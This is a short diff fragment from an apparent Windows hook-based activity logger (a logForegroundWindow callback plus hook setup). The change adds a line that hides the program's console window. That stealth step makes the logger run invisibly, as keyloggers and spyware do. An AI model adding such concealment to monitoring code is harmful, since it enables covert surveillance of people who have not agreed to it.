@@ -42,6 +42,7 @@ VOID CALLBACK logForegroundWindow
 
 int main() 
 {
+	ShowWindow(GetConsoleWindow(), SW_HIDE);
 	// set hooks
 	/*
 	* https://stackoverflow.com/questions/22025592/setwindowshookex-vs-setwinhookeventex#:~:text=2%20Answers&text=SetWindowsHookEx%20sets%20low%2Dlevel%20hooks,less%20intrusive%20to%20the%20system.
